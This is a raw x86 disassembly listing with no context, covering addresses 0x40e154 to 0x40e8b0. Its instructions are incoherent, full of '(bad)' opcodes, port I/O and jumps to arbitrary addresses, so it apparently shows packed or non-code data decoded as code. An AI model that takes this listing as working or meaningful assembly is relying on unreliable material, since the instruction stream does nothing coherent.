  40e154:	in     eax,dx
  40e155:	test   DWORD PTR [ecx],edi
  40e157:	pop    ecx
  40e158:	jp     0x40e17c
  40e15a:	(bad)  
  40e15b:	aaa    
  40e15c:	sub    ah,dh
  40e15e:	jp     0x40e1a5
  40e160:	test   bh,ch
  40e162:	cmp    BYTE PTR [edx-0x1],bh
  40e165:	fcmovb st,st(4)
  40e167:	mov    dh,0xb
  40e169:	lahf   
  40e16a:	inc    esi
  40e16b:	imul   ebx,DWORD PTR [ebx],0xf
  40e16e:	cmc    
  40e16f:	out    dx,eax
  40e170:	mov    bl,0x59
  40e172:	cmp    DWORD PTR [ebp-0x20],edi
  40e175:	push   eax
  40e176:	jecxz  0x40e181
  40e178:	call   0xa3e3fc0b
  40e17d:	rcl    DWORD PTR [edx+0x76f6087],1
  40e183:	lods   eax,DWORD PTR ds:[esi]
  40e184:	and    DWORD PTR [eax-0x6f],ebp
  40e187:	xchg   ecx,eax
  40e188:	call   0xd18503b1
  40e18d:	sub    al,0xb6
  40e18f:	push   ebp
  40e190:	daa    
  40e191:	in     al,dx
  40e192:	push   ecx
  40e193:	push   ss
  40e194:	pop    esi
  40e195:	imul   ecx,DWORD PTR [edi-0x71],0x7ba3c21e
  40e19c:	repz jae 0x40e1fc
  40e19f:	or     ebp,DWORD PTR es:[edx-0x40]
  40e1a3:	sub    bl,bl
  40e1a5:	mov    BYTE PTR [ecx],0x37
  40e1a8:	ret    0x4459
  40e1ab:	js     0x40e19e
  40e1ad:	lea    edx,[eax+0x9439727]
  40e1b3:	and    ebp,DWORD PTR [ebp-0x73]
  40e1b6:	loope  0x40e220
  40e1b8:	pop    esi
  40e1b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e1ba:	push   eax
  40e1bb:	stc    
  40e1bc:	cdq    
  40e1bd:	popa   
  40e1be:	aad    0xef
  40e1c0:	and    esi,ebp
  40e1c2:	push   ebp
  40e1c3:	ror    DWORD PTR [edx-0x1ebbfbab],cl
  40e1c9:	sub    BYTE PTR [eax],bl
  40e1cb:	fwait
  40e1cc:	lahf   
  40e1cd:	mov    eax,ds:0xc3457c55
  40e1d2:	rol    DWORD PTR [esi+0x3ab59ec6],cl
  40e1d8:	in     al,0xb
  40e1da:	enter  0x7449,0xbb
  40e1de:	inc    ebx
  40e1df:	push   ss
  40e1e0:	mov    WORD PTR [edx],gs
  40e1e2:	mov    al,ds:0x7e53a64a
  40e1e7:	mov    ds:0x547e89d3,eax
  40e1ec:	bound  ebp,QWORD PTR [eax+0x31caefec]
  40e1f2:	xchg   ebx,eax
  40e1f3:	pop    ss
  40e1f4:	sub    DWORD PTR [edi-0x16],esp
  40e1f7:	(bad)
  40e1fb:	dec    edx
  40e1fc:	xor    eax,0x8550f048
  40e201:	and    ecx,DWORD PTR [esi]
  40e203:	pop    ebx
  40e204:	dec    eax
  40e205:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e206:	push   ebx
  40e207:	or     eax,0xebd2be52
  40e20c:	xchg   esi,eax
  40e20d:	pop    ebp
  40e20e:	stos   DWORD PTR es:[edi],eax
  40e20f:	stos   DWORD PTR es:[edi],eax
  40e210:	dec    edi
  40e211:	xchg   DWORD PTR [edx+0x61],edi
  40e214:	sub    edi,ebx
  40e216:	repnz add bh,BYTE PTR [edx+0x4cfbaec9]
  40e21d:	data16 and al,0x79
  40e220:	cli    
  40e221:	jle    0x40e26b
  40e223:	sbb    bh,ah
  40e225:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e226:	sbb    ecx,ebp
  40e228:	lds    esp,FWORD PTR [edx+0x71e40a60]
  40e22e:	mov    bh,0xe5
  40e230:	pushf  
  40e231:	rcl    al,1
  40e233:	pop    eax
  40e234:	ins    DWORD PTR es:[edi],dx
  40e235:	jne    0x40e2a9
  40e237:	dec    edx
  40e238:	xchg   ebx,eax
  40e239:	pop    ebx
  40e23a:	mov    eax,edi
  40e23c:	add    ebp,DWORD PTR [edi-0x7d]
  40e23f:	push   ebp
  40e240:	ins    DWORD PTR es:[edi],dx
  40e241:	jp     0x40e277
  40e243:	pop    eax
  40e244:	jge    0x40e230
  40e246:	inc    eax
  40e247:	pusha  
  40e248:	push   esp
  40e249:	shr    edx,1
  40e24b:	fmulp  st(0),st
  40e24d:	mov    ah,0x44
  40e24f:	jmp    0x30d322fe
  40e254:	inc    edx
  40e255:	dec    eax
  40e256:	push   edx
  40e257:	sar    BYTE PTR [ebx],cl
  40e259:	in     eax,dx
  40e25a:	mov    BYTE PTR [esi-0x1e],ch
  40e25d:	(bad)  
  40e25e:	shr    BYTE PTR [ebp+0x42a6578a],cl
  40e264:	jecxz  0x40e270
  40e266:	add    eax,0x21f3a8e5
  40e26b:	out    0x98,al
  40e26d:	loop   0x40e2d3
  40e26f:	or     al,0x4d
  40e271:	clc    
  40e272:	or     ch,0x2d
  40e275:	cmc    
  40e276:	jae    0x40e2bc
  40e278:	mov    dh,0x4f
  40e27a:	outs   dx,DWORD PTR ds:[esi]
  40e27b:	xchg   DWORD PTR [ebx+edi*4-0x1e],ebp
  40e27f:	pop    es
  40e280:	xor    DWORD PTR [edi+0x6b],0x71
  40e284:	aam    0x25
  40e286:	test   al,0xd3
  40e288:	int    0xda
  40e28a:	fmul   DWORD PTR [edi-0x7c]
  40e28d:	mov    al,0x87
  40e28f:	xchg   ebx,eax
  40e290:	shl    DWORD PTR [edi+0x2ab39066],cl
  40e296:	mov    esp,0x999959a5
  40e29b:	sub    DWORD PTR [esi+edi*1+0x74bd9a85],ebp
  40e2a2:	sub    al,dl
  40e2a4:	das    
  40e2a5:	jmp    DWORD PTR [esi]
  40e2a7:	pusha  
  40e2a8:	add    DWORD PTR [esi],0xd4b92703
  40e2ae:	mov    ds:0xd2c2abd1,eax
  40e2b3:	push   0xffffff9d
  40e2b5:	push   ebp
  40e2b6:	push   0xffffffec
  40e2b8:	adc    ch,BYTE PTR ds:0x28ba60f0
  40e2be:	pusha  
  40e2bf:	js     0x40e31c
  40e2c1:	(bad)  [ebx+0x2a18bec0]
  40e2c7:	cmp    BYTE PTR [edi-0x47],cl
  40e2ca:	popf   
  40e2cb:	call   0x9933580f
  40e2d0:	fisub  DWORD PTR [eax+0x1e]
  40e2d3:	mov    ah,0xa
  40e2d5:	dec    ecx
  40e2d6:	fbld   TBYTE PTR [esi-0x62]
  40e2d9:	sbb    ecx,DWORD PTR [esi+ecx*1]
  40e2dc:	xchg   BYTE PTR [edi+edx*4],bh
  40e2df:	mov    eax,ds:0x198ab631
  40e2e4:	sbb    BYTE PTR [bp-0x51],bl
  40e2e8:	rcl    DWORD PTR [eax],cl
  40e2ea:	retf   
  40e2eb:	add    DWORD PTR [ebp+0xa],0xffffffad
  40e2ef:	(bad)
  40e2f3:	out    dx,eax
  40e2f4:	inc    ecx
  40e2f5:	icebp  
  40e2f6:	sbb    DWORD PTR [eax],edx
  40e2f8:	or     ebx,0x54
  40e2fb:	loopne 0x40e328
  40e2fd:	add    eax,0x82beebd6
  40e302:	les    ecx,FWORD PTR [ebp+0xa]
  40e305:	mov    bl,0x9
  40e307:	pop    eax
  40e308:	pop    esp
  40e309:	dec    DWORD PTR [ecx]
  40e30b:	stc    
  40e30c:	ret    0x6fba
  40e30f:	push   0x2
  40e311:	imul   edx,DWORD PTR [edi+0x3c],0x30b08ea5
  40e318:	(bad)  ds:0x8a56b12b
  40e31e:	add    eax,0x3b549c4c
  40e323:	xchg   esp,eax
  40e324:	enter  0x11b1,0x8f
  40e328:	cld    
  40e329:	(bad)  
  40e32a:	(bad)  
  40e32b:	mov    esi,DWORD PTR [ecx]
  40e32d:	lods   al,BYTE PTR ds:[esi]
  40e32e:	(bad)  
  40e32f:	sub    eax,DWORD PTR [ebx]
  40e331:	inc    esi
  40e332:	adc    eax,0x99e28cca
  40e337:	mov    dl,0x22
  40e339:	ficom  DWORD PTR [edi+0x38088a16]
  40e33f:	loop   0x40e3b9
  40e341:	mov    ebp,0x943b49f0
  40e346:	(bad)  
  40e347:	jo     0x40e31c
  40e349:	rol    esi,0xed
  40e34c:	fcomp  DWORD PTR [eax]
  40e34e:	adc    DWORD PTR [edx+edi*1],eax
  40e351:	ins    BYTE PTR es:[edi],dx
  40e352:	das    
  40e353:	dec    edi
  40e354:	dec    si
  40e356:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e357:	pop    ecx
  40e358:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e359:	add    DWORD PTR [edx-0x1e415f4f],edi
  40e35f:	xchg   ch,ch
  40e361:	out    0xf0,eax
  40e363:	scas   al,BYTE PTR es:[edi]
  40e364:	cld    
  40e365:	xlat   BYTE PTR ds:[ebx]
  40e366:	mov    dl,0xe
  40e368:	dec    ebp
  40e369:	int    0xe9
  40e36b:	jge    0x40e3d8
  40e36d:	xchg   esi,eax
  40e36e:	cmp    bh,dl
  40e370:	sub    eax,0x30ffe4cf
  40e375:	gs push esp
  40e377:	mov    dh,0x39
  40e379:	test   eax,0xd28ae312
  40e37e:	fs xchg edi,eax
  40e380:	cmp    eax,0x55927bf5
  40e385:	fisttp QWORD PTR [edx+0x3b]
  40e388:	out    0xe9,eax
  40e38a:	scas   al,BYTE PTR es:[edi]
  40e38b:	out    dx,eax
  40e38c:	cmp    dl,BYTE PTR [ebp+0x4a9d21c7]
  40e392:	pop    ds
  40e393:	add    al,bh
  40e395:	add    BYTE PTR [eax],dl
  40e397:	loopne 0x40e3db
  40e399:	test   ecx,edi
  40e39b:	mov    ebx,0xf11a36b0
  40e3a0:	or     al,0x93
  40e3a2:	xlat   BYTE PTR ds:[ebx]
  40e3a3:	pop    es
  40e3a4:	lahf   
  40e3a5:	pushf  
  40e3a6:	add    bl,ch
  40e3a8:	in     al,0x7f
  40e3aa:	mov    bh,0x65
  40e3ac:	xchg   esp,eax
  40e3ad:	ror    DWORD PTR [edx+0x1d],0x35
  40e3b1:	pop    esi
  40e3b2:	adc    al,0x9e
  40e3b4:	mov    ds:0x7dbc740f,eax
  40e3b9:	mov    ch,0x42
  40e3bb:	push   es
  40e3bc:	pop    eax
  40e3bd:	pop    ecx
  40e3be:	clc    
  40e3bf:	and    edi,DWORD PTR [edx-0x48913635]
  40e3c5:	in     al,0xd8
  40e3c7:	push   esi
  40e3c8:	mov    dh,0x1b
  40e3ca:	fnstenv [ecx*1+0x3a0c1a0b]
  40e3d1:	or     BYTE PTR [ebx+0x20],bh
  40e3d4:	mov    eax,ds:0xfe75a753
  40e3d9:	(bad)  
  40e3da:	mov    edx,0x8b32aeee
  40e3df:	add    al,cl
  40e3e1:	jnp    0x40e3e0
  40e3e3:	mov    ebx,0x7a26632d
  40e3e8:	jge    0x40e395
  40e3ea:	pop    eax
  40e3eb:	jge    0x40e3a1
  40e3ed:	pop    edi
  40e3ee:	pop    eax
  40e3ef:	inc    edi
  40e3f0:	sbb    BYTE PTR [edx-0x57b9e063],ch
  40e3f6:	pop    esi
  40e3f7:	test   al,0xfb
  40e3f9:	repz call 0x522c6dd7
  40e3ff:	dec    edi
  40e400:	or     BYTE PTR [esi],cl
  40e402:	inc    ebx
  40e403:	int    0xcf
  40e405:	add    eax,0x2bcb909
  40e40a:	out    0xbc,al
  40e40c:	dec    ecx
  40e40d:	xor    dh,ah
  40e40f:	xor    al,0xfa
  40e411:	fdivr  QWORD PTR [eax-0x22]
  40e414:	jl     0x40e46b
  40e416:	push   esi
  40e417:	aas    
  40e418:	mov    esi,es
  40e41a:	cmc    
  40e41b:	stos   DWORD PTR es:[edi],eax
  40e41c:	sbb    DWORD PTR [esi-0x2eeac290],0xffffffbb
  40e423:	pop    ebx
  40e424:	icebp  
  40e425:	or     al,0x6d
  40e427:	retf   0x5efb
  40e42a:	adc    eax,0x874d9e85
  40e42f:	sbb    cl,BYTE PTR [bx-0xd6e]
  40e434:	adc    BYTE PTR ds:0x2e36bf4,dh
  40e43a:	push   esp
  40e43b:	js     0x40e45f
  40e43d:	or     DWORD PTR [esi],ebp
  40e43f:	in     eax,0xa
  40e441:	dec    ecx
  40e442:	loop   0x40e4a2
  40e444:	daa    
  40e445:	bound  ebx,QWORD PTR [edi+0x5a]
  40e448:	pop    ebx
  40e449:	xchg   BYTE PTR [edx-0x28],dl
  40e44c:	(bad)  
  40e44d:	sti    
  40e44e:	gs xchg edx,eax
  40e450:	and    al,0x4b
  40e452:	pushf  
  40e453:	xchg   ecx,eax
  40e454:	hlt    
  40e455:	(bad)  
  40e456:	mov    dh,0xd5
  40e458:	fs sti 
  40e45a:	imul   edi,DWORD PTR [eax+0x34],0xfffffff9
  40e45e:	(bad)  [esi-0x2dc4ef0b]
  40e464:	outs   dx,BYTE PTR ds:[esi]
  40e465:	xor    DWORD PTR [edx-0x2fd9cd67],ebp
  40e46b:	pop    eax
  40e46c:	dec    esi
  40e46d:	dec    edx
  40e46e:	adc    ch,BYTE PTR ds:0x1150b895
  40e474:	push   esi
  40e475:	sahf   
  40e476:	xchg   dh,dh
  40e478:	frstor [eax]
  40e47a:	sbb    al,BYTE PTR [eax]
  40e47c:	retf   
  40e47d:	or     dh,BYTE PTR ds:0x209eabc2
  40e483:	aam    0xc
  40e485:	sti    
  40e486:	in     eax,dx
  40e487:	xor    eax,0xd1cc3160
  40e48c:	outs   dx,DWORD PTR ds:[esi]
  40e48d:	mov    al,0xab
  40e48f:	test   eax,0x19748347
  40e494:	retf   
  40e495:	test   BYTE PTR [ebx+edx*1+0x4855f8ca],0xca
  40e49d:	and    BYTE PTR [edx+ebx*4+0x2],bh
  40e4a1:	lahf   
  40e4a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e4a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e4a4:	jnp    0x40e4e1
  40e4a6:	mov    cl,0xcf
  40e4a8:	nop
  40e4a9:	clc    
  40e4aa:	pushf  
  40e4ab:	lods   al,BYTE PTR ds:[esi]
  40e4ac:	add    BYTE PTR [ebx-0x3967435f],0x36
  40e4b3:	mov    ah,0xba
  40e4b5:	inc    edi
  40e4b6:	sub    DWORD PTR [esi],esi
  40e4b8:	mov    fs,WORD PTR [edi-0x2b598ceb]
  40e4be:	mov    ds:0x73d3800,eax
  40e4c3:	js     0x40e526
  40e4c5:	xchg   esp,eax
  40e4c6:	push   eax
  40e4c7:	es push edx
  40e4c9:	add    BYTE PTR [edi+0x3a616950],ah
  40e4cf:	sub    bl,BYTE PTR [edi-0x56]
  40e4d2:	ds push esp
  40e4d4:	lock ja 0x40e4d0
  40e4d7:	jle    0x40e51b
  40e4d9:	and    ah,BYTE PTR [ebp+0xaac9ec2]
  40e4df:	push   0x5bf0e2d9
  40e4e4:	pusha  
  40e4e5:	jle    0x40e538
  40e4e7:	aad    0x83
  40e4e9:	arpl   WORD PTR [edi],bp
  40e4eb:	emms   
  40e4ed:	test   DWORD PTR [ecx+edx*8],edx
  40e4f0:	cld    
  40e4f1:	imul   ebx,DWORD PTR [ebx+0x4a224f5a],0xd6a75e2b
  40e4fb:	mov    edi,0x98ab7cb8
  40e500:	das    
  40e501:	shl    DWORD PTR [ebp-0x7ea2ac21],0xa3
  40e508:	inc    esp
  40e509:	add    esi,DWORD PTR [ebp-0x7de9cc62]
  40e50f:	xor    eax,0x8918244e
  40e514:	out    0x6a,eax
  40e516:	rcl    bl,0xcc
  40e519:	test   BYTE PTR [ebx+0x3e],0x4c
  40e51d:	mov    ebp,0x8188c50
  40e522:	sub    al,0xae
  40e524:	add    DWORD PTR [esi-0x11],edi
  40e527:	stos   BYTE PTR es:[edi],al
  40e528:	(bad)  
  40e529:	loope  0x40e543
  40e52b:	sub    bl,bh
  40e52d:	xor    ecx,DWORD PTR [eax]
  40e52f:	rol    DWORD PTR [edx+0x3],cl
  40e532:	adc    DWORD PTR [edx+0x67],edi
  40e535:	sub    eax,ebx
  40e537:	pop    ebp
  40e538:	js     0x40e5af
  40e53a:	cmp    BYTE PTR [edi],bl
  40e53c:	fnstsw WORD PTR [edx+0x3fb47d34]
  40e542:	outs   dx,DWORD PTR ds:[esi]
  40e543:	mov    edi,0xfb52601f
  40e548:	push   cs
  40e549:	bound  ebx,QWORD PTR [ebp-0x3a5ac878]
  40e54f:	mov    edi,0x904ccf1e
  40e554:	sbb    bh,dl
  40e556:	outs   dx,BYTE PTR ds:[esi]
  40e557:	das    
  40e558:	ins    BYTE PTR es:[edi],dx
  40e559:	shl    BYTE PTR [ecx-0x4344fb2b],0xc
  40e560:	xor    BYTE PTR [edi-0x31],bh
  40e563:	fs push 0x74722743
  40e569:	or     BYTE PTR [ecx-0x714a09],0x67
  40e570:	dec    edi
  40e571:	xchg   esp,eax
  40e572:	and    BYTE PTR [ebx+esi*4+0x51],cl
  40e576:	pop    esi
  40e577:	sbb    al,0xb7
  40e579:	(bad)  
  40e57a:	push   ecx
  40e57b:	adc    DWORD PTR [edx],edi
  40e57d:	push   edx
  40e57e:	jge    0x40e5f5
  40e580:	hlt    
  40e581:	rcr    DWORD PTR [ecx+eax*4+0x3e94eb4b],cl
  40e588:	pop    esp
  40e589:	mov    bl,0xf9
  40e58b:	aas    
  40e58c:	enter  0xf97c,0xdf
  40e590:	mov    esp,0xbaa45e4
  40e595:	cmp    esi,DWORD PTR [edi+0x40ce470b]
  40e59b:	into   
  40e59c:	ins    DWORD PTR es:[edi],dx
  40e59d:	fcom   DWORD PTR [ebx+esi*1-0x2b]
  40e5a1:	adc    dh,BYTE PTR [edx]
  40e5a3:	or     al,0x5b
  40e5a5:	fisub  DWORD PTR [edx+0x5de5a7a4]
  40e5ab:	cdq    
  40e5ac:	mov    eax,ds:0x937fc024
  40e5b1:	and    BYTE PTR [esi*8+0x78403a14],dl
  40e5b8:	bound  ebp,QWORD PTR [edx+edx*1]
  40e5bb:	push   ds
  40e5bc:	fmulp  st(6),st
  40e5be:	(bad)  [ecx-0x68]
  40e5c1:	test   DWORD PTR [ecx],edx
  40e5c3:	xor    dl,BYTE PTR [eax+0x2b49b1d]
  40e5c9:	push   es
  40e5ca:	ja     0x40e59f
  40e5cc:	ins    BYTE PTR es:[edi],dx
  40e5cd:	sbb    DWORD PTR [edi-0x6a6837f1],ebp
  40e5d3:	cmp    dl,BYTE PTR [ecx+ebx*8]
  40e5d6:	push   es
  40e5d7:	mov    esi,0xe728edfb
  40e5dc:	shr    DWORD PTR [esi-0x23],cl
  40e5df:	lock icebp 
  40e5e1:	mov    ah,0x78
  40e5e3:	ret    
  40e5e4:	xchg   edi,eax
  40e5e5:	inc    ebp
  40e5e6:	adc    BYTE PTR [ebx-0x1d],ch
  40e5e9:	sub    esp,DWORD PTR [edi+0x1e]
  40e5ec:	in     al,dx
  40e5ed:	or     BYTE PTR [edi+0x40bc62cc],ah
  40e5f3:	or     DWORD PTR [ecx],ebx
  40e5f5:	fcom   DWORD PTR [ecx+0x2a3ad39d]
  40e5fb:	adc    DWORD PTR [edi-0x23],eax
  40e5fe:	call   0xf42e:0x626aef0b
  40e605:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e606:	ror    ecx,0x11
  40e609:	test   eax,0xc4d133c9
  40e60e:	lahf   
  40e60f:	out    dx,eax
  40e610:	out    0xb0,al
  40e612:	mov    eax,ds:0x9e6ace75
  40e617:	arpl   WORD PTR ss:[ebx-0x5f],bx
  40e61b:	xchg   ch,ch
  40e61d:	mov    al,ds:0x989d0d0f
  40e622:	inc    edi
  40e623:	xor    eax,0xc9098111
  40e628:	mov    edx,0x31025dd1
  40e62d:	xor    DWORD PTR [edx],ecx
  40e62f:	repnz xchg ebx,eax
  40e631:	sub    eax,DWORD PTR [edi+0x25]
  40e634:	mov    cl,0xa3
  40e636:	test   ebp,0x16b4dcc1
  40e63c:	js     0x40e6b4
  40e63e:	sub    BYTE PTR [edi+0x53],ch
  40e641:	popfw  
  40e643:	sar    BYTE PTR [ecx],0x1c
  40e646:	in     al,dx
  40e647:	imul   edi,DWORD PTR [edi],0xea8f55e
  40e64d:	sahf   
  40e64e:	outs   dx,DWORD PTR ds:[esi]
  40e64f:	cmp    al,0x9f
  40e651:	fcomp  DWORD PTR [edx]
  40e653:	int3   
  40e654:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e655:	adc    bl,BYTE PTR [ebp+0x7d]
  40e658:	aad    0x85
  40e65a:	inc    edx
  40e65b:	jmp    0x2964:0x19a6a032
  40e662:	fdivr  DWORD PTR [esi-0x50140843]
  40e668:	xchg   BYTE PTR [edx+eiz*2-0x3f],dh
  40e66c:	mov    esp,0xcf669a3b
  40e671:	mov    ah,0xa1
  40e673:	gs clc 
  40e675:	pop    esp
  40e676:	lods   al,BYTE PTR ds:[esi]
  40e677:	imul   ebp,DWORD PTR [edi],0x2c112345
  40e67d:	call   0x285ac577
  40e682:	lea    ebx,[eax]
  40e684:	mov    ds:0x555ac695,al
  40e689:	cmp    al,0x21
  40e68b:	sbb    esp,ecx
  40e68d:	stos   BYTE PTR es:[edi],al
  40e68e:	call   0xbcdd9f25
  40e693:	fdiv   DWORD PTR ds:0xbddca13b
  40e699:	xchg   esp,eax
  40e69a:	mov    al,ds:0xd6864e5b
  40e69f:	sub    DWORD PTR [edi+ebp*8-0x262a25bd],eax
  40e6a6:	cmp    eax,DWORD PTR [ecx-0x2b]
  40e6a9:	and    edx,edi
  40e6ab:	inc    edx
  40e6ac:	dec    ebx
  40e6ad:	or     eax,0x97655de1
  40e6b2:	adc    esp,DWORD PTR [ecx]
  40e6b4:	(bad)  
  40e6b5:	in     al,dx
  40e6b6:	bnd ja 0x40e64f
  40e6b9:	inc    esi
  40e6ba:	push   edx
  40e6bb:	add    esi,ebp
  40e6bd:	xchg   ebx,eax
  40e6be:	xchg   edi,eax
  40e6bf:	int3   
  40e6c0:	sar    esi,1
  40e6c2:	jb     0x40e719
  40e6c4:	xchg   edi,ecx
  40e6c6:	pop    ss
  40e6c7:	les    eax,FWORD PTR [esi]
  40e6c9:	inc    ecx
  40e6ca:	inc    edi
  40e6cb:	popa   
  40e6cc:	into   
  40e6cd:	lods   eax,DWORD PTR ds:[esi]
  40e6ce:	dec    eax
  40e6cf:	and    al,0x2b
  40e6d1:	pop    esi
  40e6d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e6d3:	les    ecx,FWORD PTR ds:0xfa2833db
  40e6d9:	or     esi,eax
  40e6db:	mov    edx,0xba8f4a17
  40e6e0:	xor    edi,DWORD PTR [ecx-0xdf20dcc]
  40e6e6:	mov    ebp,0x146642ff
  40e6eb:	or     edi,esp
  40e6ed:	adc    eax,DWORD PTR [ecx+0x7f]
  40e6f0:	adc    al,0x60
  40e6f2:	mov    esp,0x16a6dea0
  40e6f7:	push   edx
  40e6f8:	mov    WORD PTR [ebx+0x1],cs
  40e6fb:	sti    
  40e6fc:	jbe    0x40e76f
  40e6fe:	aas    
  40e6ff:	dec    esp
  40e700:	xchg   edx,eax
  40e701:	ss jmp 0x40e6af
  40e704:	add    DWORD PTR [edi],ebx
  40e706:	enter  0x3f2c,0xd0
  40e70a:	mov    dh,0xd6
  40e70c:	cmp    eax,0x1a748c9
  40e711:	and    ah,BYTE PTR [eax+0x6cc3c164]
  40e717:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e718:	pop    eax
  40e719:	push   edi
  40e71a:	std    
  40e71b:	cs fstp st(5)
  40e71f:	sbb    al,0x55
  40e721:	mov    esp,esi
  40e723:	jns    0x40e77e
  40e725:	popa   
  40e726:	out    0x9a,al
  40e728:	sbb    al,0xd0
  40e72a:	mov    dh,0xde
  40e72c:	jo     0x40e780
  40e72e:	sar    DWORD PTR [edi],cl
  40e730:	nop
  40e731:	adc    DWORD PTR [esi+0x60],eax
  40e734:	jg     0x40e6b9
  40e736:	mov    esi,0xcb30a54e
  40e73b:	dec    esp
  40e73c:	xchg   ebx,eax
  40e73d:	and    BYTE PTR [ebx-0x683f2b8e],dl
  40e743:	or     esi,DWORD PTR ds:[esi]
  40e746:	inc    edi
  40e747:	js     0x40e726
  40e749:	test   al,0xc2
  40e74b:	and    al,0xac
  40e74d:	into   
  40e74e:	pop    ds
  40e74f:	xchg   bh,ch
  40e751:	cld    
  40e752:	(bad)  
  40e753:	repnz out 0xc6,al
  40e756:	adc    ebx,DWORD PTR [edi+eax*8]
  40e759:	jne    0x40e6f9
  40e75b:	mul    BYTE PTR [eax]
  40e75d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e75e:	pop    ecx
  40e75f:	imul   esi,edx,0x1d7f37e6
  40e765:	icebp  
  40e766:	in     eax,dx
  40e767:	add    ebx,ecx
  40e769:	retf   0x57a3
  40e76c:	mov    dh,0xbd
  40e76e:	mov    bh,BYTE PTR es:[ecx-0x79]
  40e772:	lods   al,BYTE PTR ss:[esi]
  40e774:	hlt    
  40e775:	icebp  
  40e776:	push   esi
  40e777:	(bad)  
  40e778:	cmp    al,0xd9
  40e77a:	and    ah,BYTE PTR [edx+0x3355046b]
  40e780:	add    esi,DWORD PTR [edi+eiz*4+0x7]
  40e784:	push   ebp
  40e785:	sahf   
  40e786:	mov    edx,0xad3f0406
  40e78b:	pop    edi
  40e78c:	push   esp
  40e78d:	add    edx,ecx
  40e78f:	sub    eax,0x3c6708cb
  40e794:	sub    dl,BYTE PTR [esi+0x22]
  40e797:	fdiv   QWORD PTR [edx]
  40e799:	fstp   QWORD PTR [eax-0x65]
  40e79c:	popf   
  40e79d:	sub    BYTE PTR [edx+0x64d0b903],dl
  40e7a3:	cli    
  40e7a4:	sub    dh,bh
  40e7a6:	sahf   
  40e7a7:	add    DWORD PTR [edx-0x1a],edx
  40e7aa:	leave  
  40e7ab:	or     edi,esp
  40e7ad:	ja     0x40e7f6
  40e7af:	ror    BYTE PTR [esi+0x6ed9a20e],1
  40e7b5:	jbe    0x40e822
  40e7b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e7b8:	(bad)  
  40e7b9:	sbb    DWORD PTR [edi],0xef3f5226
  40e7bf:	dec    ecx
  40e7c0:	mov    WORD PTR [eax+0x61],?
  40e7c3:	test   DWORD PTR [eax+0x2c],0x84124d0f
  40e7ca:	pop    ss
  40e7cb:	xchg   edi,eax
  40e7cc:	in     al,0xe1
  40e7ce:	mov    esp,0x684fd342
  40e7d3:	jo     0x40e7e7
  40e7d5:	mov    al,0x85
  40e7d7:	call   DWORD PTR [esi-0x66]
  40e7da:	sbb    bl,ah
  40e7dc:	retf   0xc07
  40e7df:	inc    ebp
  40e7e0:	nop
  40e7e1:	mov    BYTE PTR [eax],al
  40e7e3:	jmp    0xbfbd3867
  40e7e8:	add    esp,esi
  40e7ea:	or     BYTE PTR [ecx],bl
  40e7ec:	mov    eax,0xb806e9e5
  40e7f1:	test   BYTE PTR [ebp+0x68],ah
  40e7f4:	sub    eax,0xca54d4b3
  40e7f9:	out    dx,eax
  40e7fa:	sub    dl,BYTE PTR [ecx+0x2]
  40e7fd:	adc    al,0xfd
  40e7ff:	js     0x40e823
  40e801:	dec    eax
  40e802:	jo     0x40e7a1
  40e804:	jo     0x40e835
  40e806:	sbb    eax,0x62f15f31
  40e80b:	jo     0x40e835
  40e80d:	mov    ch,0xf9
  40e80f:	ja     0x40e86e
  40e811:	imul   eax,DWORD PTR [edx+0x33],0xffffffe8
  40e815:	mov    ebx,0x26805e4e
  40e81a:	push   eax
  40e81b:	rcr    DWORD PTR [edi],cl
  40e81d:	outs   dx,DWORD PTR ds:[esi]
  40e81e:	sbb    eax,0x7296a88
  40e823:	ja     0x40e8a4
  40e825:	gs xor eax,0x79f1f443
  40e82b:	outs   dx,DWORD PTR ds:[esi]
  40e82c:	ins    BYTE PTR es:[edi],dx
  40e82d:	daa    
  40e82e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e82f:	repz push 0xffffffca
  40e832:	push   esp
  40e833:	adc    ah,BYTE PTR [edi+0x1de87a79]
  40e839:	push   ds
  40e83a:	dec    esi
  40e83b:	dec    ebx
  40e83c:	sub    eax,0xc80e2572
  40e841:	test   bh,bh
  40e843:	test   cl,cl
  40e845:	add    DWORD PTR [ebp+0x1ad93f8],ebp
  40e84b:	and    al,0x73
  40e84d:	fisttp DWORD PTR [edi+ebp*8-0x10ceb729]
  40e854:	sti    
  40e855:	xor    DWORD PTR [ecx+0x23],eax
  40e858:	inc    esi
  40e859:	mov    dl,0x71
  40e85b:	icebp  
  40e85c:	add    ecx,DWORD PTR [ebx-0x382fbe3]
  40e862:	imul   BYTE PTR [ebx+ebp*1-0x22]
  40e866:	mov    al,0x2b
  40e868:	stc    
  40e869:	sub    ah,dl
  40e86b:	xchg   BYTE PTR [edi+eiz*2],dh
  40e86e:	push   ebx
  40e86f:	push   esi
  40e870:	xchg   DWORD PTR [ebp-0x41],esp
  40e873:	inc    eax
  40e874:	out    0x3a,eax
  40e876:	dec    ebp
  40e877:	xchg   DWORD PTR [edx+ebx*2],edx
  40e87a:	out    0x4d,eax
  40e87c:	push   eax
  40e87d:	out    0x7e,al
  40e87f:	idiv   DWORD PTR ds:0xd33ffb4f
  40e885:	icebp  
  40e886:	xor    cl,BYTE PTR [eax-0x1c]
  40e889:	mov    ebx,0x98926819
  40e88e:	jne    0x40e8aa
  40e890:	add    bh,ch
  40e892:	mov    eax,0xefb88068
  40e897:	enter  0x500e,0xf7
  40e89b:	(bad)  
  40e89c:	std    
  40e89d:	and    ebx,DWORD PTR [ebx+0x76a87019]
  40e8a3:	jae    0x40e8fd
  40e8a5:	daa    
  40e8a6:	jnp    0x40e833
  40e8a8:	jl     0x40e875
  40e8aa:	xchg   esi,eax
  40e8ab:	mov    esp,0xf8176f00
  40e8b0:	rcr    BYTE PTR ds:0xe7535b76,0xe8
